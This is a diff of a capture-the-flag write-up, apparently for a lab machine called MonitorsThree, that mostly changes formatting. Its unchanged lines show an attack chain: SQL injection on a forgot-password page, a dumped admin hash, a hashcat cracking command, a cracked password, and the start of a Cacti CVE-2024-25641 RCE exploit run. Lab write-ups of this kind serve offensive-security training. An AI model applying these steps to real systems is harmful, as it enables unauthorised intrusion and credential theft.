@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
 
 # SQL Injection
 
-There is SQL injection on the forgot password page here:
+There is SQL injection on the forgot password page on the monitorsthree site.:
 
 ![image](https://github.com/user-attachments/assets/a4fae5cc-f532-49bb-8228-d0d3068cd8f1)
 
@@ -60,7 +60,7 @@ admin@monitorsthree.htb:31a181c8372e3afc59dab863430610e8
 ```
 
 We can try cracking the admin@monitorsthree credential:
-```
+```bash
 hashcat -m 0 -a 0 31a181c8372e3afc59dab863430610e8 /usr/share/wordlists/rockyou.txt
 ```
 This will provide a password.
@@ -88,7 +88,7 @@ More can be found <a href="https://github.com/Cacti/cacti/security/advisories/GH
 
 I used an automated attack found <a href="https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26">here.</a>
 
-```
+```python
 my-venv/bin/python3 CVE-2024-25641.py \
     --user admin \
     --pass greencacti2001 \
